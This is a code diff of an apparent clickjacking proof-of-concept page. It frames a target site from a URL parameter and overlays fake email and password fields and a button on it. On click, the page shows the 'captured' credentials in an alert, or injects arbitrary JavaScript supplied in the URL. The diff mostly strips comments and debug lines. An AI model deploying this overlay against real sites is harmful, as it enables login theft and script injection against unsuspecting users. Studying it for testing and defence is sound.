@@ -2,10 +2,8 @@
 <html lang="en">
 
 <head>
-     <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
-
-
     <link rel="shortcut icon" type="image/x-icon"
           href="resources/img/logo.ico">
 
@@ -33,8 +31,6 @@
         }
 
         $(document).ready(function () {
-
-
             var targetURL = getURLParameter('target');
 
             var userNameTop = getURLParameter('userNameTop');
@@ -50,58 +46,31 @@
             var usernameStyleParam = getURLParameter('usernameStyle');
             var buttonStyleParam = getURLParameter('buttonStyle');
             var customJavaScript = getURLParameter('customJavaScript');
-            console.log(customJavaScript);
 
-//            <%--EMAIL--%>
-//            var baseEmailStyle = 'outline:none; box-shadow:none;border: none !important;height: 20px;width: 100px;background-color:#f9f9f9;';
             var emailStyle = usernameStyleParam + 'position: absolute; z-index: 2; top: ' + userNameTop + 'px; left: ' + userNameLeft + 'px;';
             $('#inputMalEmail').attr('style', emailStyle);
 
-//            <%--PASSWORD--%>
-//            var basePasswordStyle = 'outline:none; box-shadow:none;border: none !important;height: 20px;width: 325px;background-color:#f9f9f9;';
             var passwordStyle = passwordStyleParam + 'position: absolute; z-index: 2; top: ' + passwordTop + 'px; left: ' + passwordLeft + 'px;';
             $('#inputMalPassword').attr('style', passwordStyle);
 
-//            <%--BUTTON--%>
-//            var baseButtonStyle = 'outline:none; box-shadow:none;border: none !important;width:83px;height: 30px;color: #666666;font-weight: bold;font-family:verdana,sans-serif;';
             var buttonStyle = buttonStyleParam + 'position: absolute; z-index: 2; top: ' + buttonTop + 'px; left: ' + buttonLeft + 'px;';
             $('#jacksButton').attr('style', buttonStyle);
-
-
-//            <%--DEBUGGING--%>
-
-//            var position = $('#inputMalEmail').offset();
-//            console.log('Email left: ' + position.left);
-//            console.log('Email top: ' + position.top);
-//
-//            var width = $('#inputMalEmail').width();
-//            console.log('email: width: ' + width);
-//
-//            var height = $('#inputMalEmail').height();
-//            console.log('email: height: ' + height);
-
 
             $("#targetIframe").attr('src', targetURL);
 
             $('#jacksButton').click(function () {
-
                 if (customJavaScript.length>0) {
                     $('<script>').attr('type', 'text/javascript').text(customJavaScript).appendTo('head');
                 }
-
                 else
                 {
                     var jacksEmail = $('#inputMalEmail').val();
                     var jacksPassword = $('#inputMalPassword').val();
-
                     console.log('Email: ' + jacksEmail);
-
-                    alert('Captured Creds are: \nUserame is: ' + jacksEmail + ' \nAND\n Password is: ' + jacksPassword);
+                    alert('Captured Creds are: \nUserame is: ' + jacksEmail + ' \nAND\nPassword is: ' + jacksPassword);
                     location.reload();
                 }
-
             });
-
         });
     </script>
 
